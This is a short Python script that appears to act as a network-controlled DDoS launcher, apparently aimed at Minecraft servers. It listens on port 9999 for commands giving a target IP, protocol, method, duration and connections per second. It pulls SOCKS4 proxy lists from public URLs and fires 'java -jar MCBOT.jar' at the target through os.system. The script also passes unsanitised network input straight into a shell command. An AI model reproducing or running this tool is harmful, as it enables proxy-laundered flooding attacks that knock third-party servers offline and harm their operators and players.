import socket, os, threading
try:
    import requests as req
except (ImportError):
    print('install requests')
#ip,protocol,method,time,cps
sitesocks4 = [
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
'https://api.openproxylist.xyz/socks4.txt'
]
def ddos(perm):
    ip = perm[0]
    protocol=perm[1]
    method=perm[2]
    time=perm[3]
    cps=perm[4]
    os.system(f'java -jar MCBOT.jar {ip} {protocol} {method} {time} {cps}')
    os.system(f"")
def updateproxy():
    with open('proxies.txt', 'wb') as file:
        file.write(b'')
    for i in range(len(sitesocks4)):
        get = req.get(sitesocks4[i])
        with open('proxies.txt', 'r') as file:
            saveproxy = file.read()
            file.close()
        with open('proxies.txt', 'w') as file:
            file.write(f'{saveproxy}\n{get.text}')
            file.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", 9999))
s.listen(999)
while True:
    conn, addr = s.accept()
    data = conn.recv(1024)
    data = data.decode("utf-8")
    updateproxy()
    print(f"{data}")
    args=data.split('|')
    ddos(args)
    conn.send(b'Good')
    conn.close()